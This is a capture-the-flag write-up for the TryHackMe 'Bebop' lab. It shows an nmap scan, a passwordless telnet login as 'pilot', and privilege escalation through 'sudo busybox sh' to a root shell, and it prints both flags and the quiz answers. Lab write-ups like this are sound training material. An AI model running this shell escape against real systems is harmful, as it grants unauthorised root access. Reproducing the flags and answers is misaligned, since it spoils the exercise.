# [Bebop](https://tryhackme.com/room/bebop)

First run a basic nmap scan.
```
nmap -T4 10.48.128.109        
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-11 11:45 +0600
Nmap scan report for 10.48.128.109
Host is up (0.12s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
23/tcp open  telnet

Nmap done: 1 IP address (1 host up) scanned in 11.75 seconds
```
port 23 (telnet) is open.
Since Telnet is open, connect to the target using Telnet. And we already know the codename is `pilot`, use that as login credential.
```
telnet 10.48.128.109     
Trying 10.48.128.109...
Connected to 10.48.128.109.
Escape character is '^]'.
login: pilot
Last login: Sat Oct  5 23:48:53 from cpc147224-roth10-2-0-cust456.17-1.cable.virginm.net
FreeBSD 11.2-STABLE (GENERIC) #0 r345837: Thu Apr  4 02:07:22 UTC 2019

Welcome to FreeBSD!

Release Notes, Errata: https://www.FreeBSD.org/releases/
Security Advisories:   https://www.FreeBSD.org/security/
FreeBSD Handbook:      https://www.FreeBSD.org/handbook/
FreeBSD FAQ:           https://www.FreeBSD.org/faq/
Questions List: https://lists.FreeBSD.org/mailman/listinfo/freebsd-questions/
FreeBSD Forums:        https://forums.FreeBSD.org/

Documents installed with the system are in the /usr/local/share/doc/freebsd/
directory, or can be installed later with:  pkg install en-freebsd-doc
For other languages, replace "en" with a language code like de or fr.

Show the version of FreeBSD installed:  freebsd-version ; uname -a
Please include that output and any error messages when posting questions.
Introduction to manual pages:  man man
FreeBSD directory layout:      man hier

Edit /etc/motd to change this login announcement.
Need to see which daemons are listening for connection requests? Use
"sockstat -4l" for IPv4, and "sockstat -l" for IPv4 and IPv6.
		-- Dru <genesis@istar.ca>
[pilot@freebsd ~]$ ls
user.txt
[pilot@freebsd ~]$ cat user.txt
THM{r3m0v3_b3f0r3_fl16h7}
```
We got the User Flag. Next, attempt privilege escalation to obtain the root flag. First, run `sudo -l` to check which commands can be executed as root. 
busybox can be run as root without a password. 

```
[pilot@freebsd /root]$ sudo -l 
User pilot may run the following commands on freebsd:
    (root) NOPASSWD: /usr/local/bin/busybox
[pilot@freebsd /root]$ sudo /usr/local/bin/busybox sh
# whoami
root
# pwd
/root
# ls
.bash_history	.history	.login		root.txt
.cshrc		.k5login	.profile
# cat root.txt 
THM{h16hw4y_70_7h3_d4n63r_z0n3}
```
`sudo /usr/local/bin/busybox sh` runs BusyBox as root and starts a shell, giving you a root command prompt. Root access successfully obtained. Now we can view the root flag.

As for the other questions: (quiz)
1. What is the low privilleged user? -> pilot
2. What binary was used to escalate privileges? -> busybox
3. What service was used to gain an initial shell? -> telnet
4. What Operating System does the drone run? -> FreeBSD
